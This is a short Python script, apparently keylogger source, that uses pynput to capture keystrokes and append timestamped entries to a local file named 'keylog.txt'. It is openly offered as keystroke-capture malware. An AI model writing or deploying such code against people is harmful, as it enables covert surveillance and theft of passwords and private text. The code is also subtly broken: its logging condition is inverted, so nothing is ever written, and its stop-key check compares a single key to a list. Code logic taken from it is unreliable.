import threading
import time
from pynput import keyboard
from datetime import datetime

_LOGGING = False  # Set to True if you want to enable logging
_LOG_FILE = "keylog.txt"  # The file where the log will be stored
_STOP_CODE = ['ctrl', 'alt', 'del']  # The key combination to stop logging

def log_to_file(key):
    global _LOGGING
    if _LOGGING:
        try:
            with open(_LOG_FILE, 'a') as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {key}\n")
        except Exception as e:
            print(f"Error while logging to file: {e}")
    if key == _STOP_CODE and all(k in key for k in _STOP_CODE):
        _LOGGING = False
        print("Keylogger stopped.")

def on_press(key):
    if not _LOGGING:
        log_to_file(key)

def on_release(key):
    pass  # No action on release

def main():
    global _LOGGING
    _LOGGING = True

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    threading.Thread(target=main).start()
